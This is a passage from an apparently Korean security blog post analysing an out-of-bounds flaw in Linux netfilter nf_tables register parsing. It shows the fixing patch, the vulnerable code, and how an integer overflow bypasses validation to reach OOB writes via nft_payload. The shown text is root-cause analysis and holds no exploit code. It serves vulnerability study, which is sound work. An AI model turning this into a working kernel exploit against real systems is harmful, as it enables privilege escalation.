</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nf_tables_api.c
</span></span><span style="display:flex;"><span><span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>net<span style="color:#f92672">/</span>netfilter<span style="color:#f92672">/</span>nf_tables_api.c
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">9275</span>,<span style="color:#ae81ff">17</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">9275</span>,<span style="color:#ae81ff">23</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_parse_u32_check</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span>attr, <span style="color:#66d9ef">int</span> max, u32 <span style="color:#f92672">*</span>dest)
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">EXPORT_SYMBOL_GPL</span>(nft_parse_u32_check);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_parse_register</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span>attr)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_parse_register</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span>attr, u32 <span style="color:#f92672">*</span>preg)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> reg;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> 	reg <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(attr));
</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">switch</span> (reg) {
</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">case</span> NFT_REG_VERDICT...NFT_REG_4:
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>		<span style="color:#66d9ef">return</span> reg <span style="color:#f92672">*</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>		<span style="color:#f92672">*</span>preg <span style="color:#f92672">=</span> reg <span style="color:#f92672">*</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>	<span style="color:#66d9ef">case</span> NFT_REG32_00...NFT_REG32_15:
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>		<span style="color:#f92672">*</span>preg <span style="color:#f92672">=</span> reg <span style="color:#f92672">+</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE <span style="color:#f92672">-</span> NFT_REG32_00;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span> 	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>		<span style="color:#66d9ef">return</span> reg <span style="color:#f92672">+</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE <span style="color:#f92672">-</span> NFT_REG32_00;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ERANGE;
</span></span><span style="display:flex;"><span> 	}
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span> }
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -9327,7 +9333,10 @@ int nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	u32 reg;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	int err;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-	reg = nft_parse_register(attr);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+	err = nft_parse_register(attr, &amp;reg);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+	if (err &lt; 0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+		return err;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	err = nft_validate_register_load(reg, len);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	if (err &lt; 0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 		return err;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">@@ -9382,7 +9391,10 @@ int nft_parse_register_store(const struct nft_ctx *ctx,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	int err;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	u32 reg;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-	reg = nft_parse_register(attr);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+	err = nft_parse_register(attr, &amp;reg);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+	if (err &lt; 0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+		return err;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">+
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	err = nft_validate_register_store(ctx, reg, data, type, len);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 	if (err &lt; 0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> 		return err;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--
</span></span></span></code></pre></div><p>NFT_REG_VERDICT … NFT_REG_4가 아니면, REG32라고 단정지어버린다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_parse_register_load</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span>attr, u8 <span style="color:#f92672">*</span>sreg, u32 len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	u32 reg;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> err;
</span></span><span style="display:flex;"><span>	reg <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_parse_register</span>(attr);
</span></span><span style="display:flex;"><span>	err <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_validate_register_load</span>(reg, len);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (err <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> err;
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>sreg <span style="color:#f92672">=</span> reg;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EXPORT_SYMBOL_GPL</span>(nft_parse_register_load);
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EXPORT_SYMBOL_GPL</span>(nft_parse_u32_check);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_parse_register</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span>attr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> reg;
</span></span><span style="display:flex;"><span>	reg <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(attr));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (reg) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_REG_VERDICT...NFT_REG_4:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> reg <span style="color:#f92672">*</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> reg <span style="color:#f92672">+</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE <span style="color:#f92672">-</span> NFT_REG32_00;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EXPORT_SYMBOL_GPL</span>(nft_dump_register);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_validate_register_load</span>(<span style="color:#66d9ef">enum</span> nft_registers reg, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (reg <span style="color:#f92672">&lt;</span> NFT_REG_1 <span style="color:#f92672">*</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (len <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (reg <span style="color:#f92672">*</span> NFT_REG32_SIZE <span style="color:#f92672">+</span> len <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">sizeof_field</span>(<span style="color:#66d9ef">struct</span> nft_regs, data))
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ERANGE;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>validation check도 우회할 수 있다.
reg &lt; 4 → EINVAL.</p>
<p>4랑 곱하면 어차피 integer overflow로 인해 bypass 가능하다.
결국 OoB
마찬가지로 register store할때도 똑같이 발생한다.</p>
<h3 id="nft_payload">nft_payload<a hidden class="anchor" aria-hidden="true" href="#nft_payload">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (tb[NFTA_PAYLOAD_SREG] <span style="color:#f92672">!=</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (tb[NFTA_PAYLOAD_DREG] <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ERR_PTR</span>(<span style="color:#f92672">-</span>EINVAL);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>nft_payload_set_ops;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_OFFSET]));
</span></span><span style="display:flex;"><span>	len    <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_LEN]));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_power_of_2</span>(len) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">IS_ALIGNED</span>(offset, len) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>	    base <span style="color:#f92672">!=</span> NFT_PAYLOAD_LL_HEADER)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>nft_payload_fast_ops;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>nft_payload_ops;
</span></span></code></pre></div><p>SREG == NOT NULL / DREG == NULL -&gt; payload_set_ops<br>
SREG == NULL / DREG == NOT NULL -&gt; payload_ops or fast<br>
총 두개로 갈려서 세팅 가능.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_expr_ops nft_payload_set_ops <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	.type		<span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>nft_payload_type,
</span></span><span style="display:flex;"><span>	.size		<span style="color:#f92672">=</span> <span style="color:#a6e22e">NFT_EXPR_SIZE</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> nft_payload_set)),
</span></span><span style="display:flex;"><span>	.eval		<span style="color:#f92672">=</span> nft_payload_set_eval,
</span></span><span style="display:flex;"><span>	.init		<span style="color:#f92672">=</span> nft_payload_set_init,
</span></span><span style="display:flex;"><span>	.dump		<span style="color:#f92672">=</span> nft_payload_set_dump,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_expr_ops nft_payload_ops <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	.type		<span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>nft_payload_type,
</span></span><span style="display:flex;"><span>	.size		<span style="color:#f92672">=</span> <span style="color:#a6e22e">NFT_EXPR_SIZE</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> nft_payload)),
</span></span><span style="display:flex;"><span>	.eval		<span style="color:#f92672">=</span> nft_payload_eval,
</span></span><span style="display:flex;"><span>	.init		<span style="color:#f92672">=</span> nft_payload_init,
</span></span><span style="display:flex;"><span>	.dump		<span style="color:#f92672">=</span> nft_payload_dump,
</span></span><span style="display:flex;"><span>	.offload	<span style="color:#f92672">=</span> nft_payload_offload,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_expr_ops nft_payload_fast_ops <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	.type		<span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>nft_payload_type,
</span></span><span style="display:flex;"><span>	.size		<span style="color:#f92672">=</span> <span style="color:#a6e22e">NFT_EXPR_SIZE</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> nft_payload)),
</span></span><span style="display:flex;"><span>	.eval		<span style="color:#f92672">=</span> nft_payload_eval,
</span></span><span style="display:flex;"><span>	.init		<span style="color:#f92672">=</span> nft_payload_init,
</span></span><span style="display:flex;"><span>	.dump		<span style="color:#f92672">=</span> nft_payload_dump,
</span></span><span style="display:flex;"><span>	.offload	<span style="color:#f92672">=</span> nft_payload_offload,
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>실질적으로 다른 역할을 하는건 payload_ops set_ops 차이다.
init → eval 순서</p>
<h3 id="nft_payload_ops">nft_payload_ops<a hidden class="anchor" aria-hidden="true" href="#nft_payload_ops">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_payload_init</span>(<span style="color:#66d9ef">const</span> structnft_ctx <span style="color:#f92672">*</span>ctx,
</span></span><span style="display:flex;"><span>			    <span style="color:#66d9ef">const</span> structnft_expr <span style="color:#f92672">*</span>expr,
</span></span><span style="display:flex;"><span>			    <span style="color:#66d9ef">const</span> structnlattr <span style="color:#f92672">*</span> consttb[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	structnft_payload <span style="color:#f92672">*</span>priv <span style="color:#f92672">=</span><span style="color:#a6e22e">nft_expr_priv</span>(expr);
</span></span><span style="display:flex;"><span>	priv<span style="color:#f92672">-&gt;</span>base   <span style="color:#f92672">=</span><span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_BASE]));
</span></span><span style="display:flex;"><span>	priv<span style="color:#f92672">-&gt;</span>offset <span style="color:#f92672">=</span><span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_OFFSET]));
</span></span><span style="display:flex;"><span>	priv<span style="color:#f92672">-&gt;</span>len    <span style="color:#f92672">=</span><span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(tb[NFTA_PAYLOAD_LEN]));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">nft_parse_register_store</span>(ctx,tb[NFTA_PAYLOAD_DREG],
</span></span><span style="display:flex;"><span>					<span style="color:#f92672">&amp;</span>priv<span style="color:#f92672">-&gt;</span>dreg, NULL,NFT_DATA_VALUE,
</span></span><span style="display:flex;"><span>					priv<span style="color:#f92672">-&gt;</span>len);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>init에서 실질적으로 검증 우회해서 dreg OOB 발생시킬 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nft_payload_eval</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_expr <span style="color:#f92672">*</span>expr,
</span></span><span style="display:flex;"><span>		      <span style="color:#66d9ef">struct</span> nft_regs <span style="color:#f92672">*</span>regs,
</span></span><span style="display:flex;"><span>		      <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_pktinfo <span style="color:#f92672">*</span>pkt)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_payload <span style="color:#f92672">*</span>priv <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_expr_priv</span>(expr);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb <span style="color:#f92672">=</span> pkt<span style="color:#f92672">-&gt;</span>skb;
</span></span><span style="display:flex;"><span>	u32 <span style="color:#f92672">*</span>dest <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>regs<span style="color:#f92672">-&gt;</span>data[priv<span style="color:#f92672">-&gt;</span>dreg];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> offset;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (priv<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">%</span> NFT_REG32_SIZE)
</span></span><span style="display:flex;"><span>		dest[priv<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">/</span> NFT_REG32_SIZE] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (priv<span style="color:#f92672">-&gt;</span>base) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_LL_HEADER:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">skb_mac_header_was_set</span>(skb))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">skb_vlan_tag_present</span>(skb)) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">nft_payload_copy_vlan</span>(dest, skb,
</span></span><span style="display:flex;"><span>						   priv<span style="color:#f92672">-&gt;</span>offset, priv<span style="color:#f92672">-&gt;</span>len))
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_mac_header</span>(skb) <span style="color:#f92672">-</span> skb<span style="color:#f92672">-&gt;</span>data;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_NETWORK_HEADER:
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_network_offset</span>(skb);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_PAYLOAD_TRANSPORT_HEADER:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pkt<span style="color:#f92672">-&gt;</span>tprot_set)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">=</span> <span style="color:#a6e22e">nft_thoff</span>(pkt);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">BUG</span>();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	offset <span style="color:#f92672">+=</span> priv<span style="color:#f92672">-&gt;</span>offset;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">skb_copy_bits</span>(skb, offset, dest, priv<span style="color:#f92672">-&gt;</span>len) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> err;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>err:
</span></span><span style="display:flex;"><span>	regs<span style="color:#f92672">-&gt;</span>verdict.code <span style="color:#f92672">=</span> NFT_BREAK;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>eval에서 실질적으로 처리한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">skb_copy_bits</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb, <span style="color:#66d9ef">int</span> offset, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>to, <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> start <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_headlen</span>(skb);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>frag_iter;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i, copy;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (offset <span style="color:#f92672">&gt;</span> (<span style="color:#66d9ef">int</span>)skb<span style="color:#f92672">-&gt;</span>len <span style="color:#f92672">-</span> len)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> fault;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* Copy header. */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> ((copy <span style="color:#f92672">=</span> start <span style="color:#f92672">-</span> offset) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (copy <span style="color:#f92672">&gt;</span> len)
</span></span><span style="display:flex;"><span>			copy <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">skb_copy_from_linear_data_offset</span>(skb, offset, to, copy);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((len <span style="color:#f92672">-=</span> copy) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>		offset <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>		to     <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">skb_shinfo</span>(skb)<span style="color:#f92672">-&gt;</span>nr_frags; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> end;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">skb_frag_t</span> <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">skb_shinfo</span>(skb)<span style="color:#f92672">-&gt;</span>frags[i];
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WARN_ON</span>(start <span style="color:#f92672">&gt;</span> offset <span style="color:#f92672">+</span> len);
</span></span><span style="display:flex;"><span>		end <span style="color:#f92672">=</span> start <span style="color:#f92672">+</span> <span style="color:#a6e22e">skb_frag_size</span>(f);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((copy <span style="color:#f92672">=</span> end <span style="color:#f92672">-</span> offset) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>			u32 p_off, p_len, copied;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>p;
</span></span><span style="display:flex;"><span>			u8 <span style="color:#f92672">*</span>vaddr;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (copy <span style="color:#f92672">&gt;</span> len)
</span></span><span style="display:flex;"><span>				copy <span style="color:#f92672">=</span> len;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">skb_frag_foreach_page</span>(f,
</span></span><span style="display:flex;"><span>					      <span style="color:#a6e22e">skb_frag_off</span>(f) <span style="color:#f92672">+</span> offset <span style="color:#f92672">-</span> start,
</span></span><span style="display:flex;"><span>					      copy, p, p_off, p_len, copied) {
</span></span><span style="display:flex;"><span>				vaddr <span style="color:#f92672">=</span> <span style="color:#a6e22e">kmap_atomic</span>(p);
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">memcpy</span>(to <span style="color:#f92672">+</span> copied, vaddr <span style="color:#f92672">+</span> p_off, p_len);
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">kunmap_atomic</span>(vaddr);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> ((len <span style="color:#f92672">-=</span> copy) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			offset <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>			to     <span style="color:#f92672">+=</span> copy;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		start <span style="color:#f92672">=</span> end;
</span></span><span style="display:flex;"><span>	}
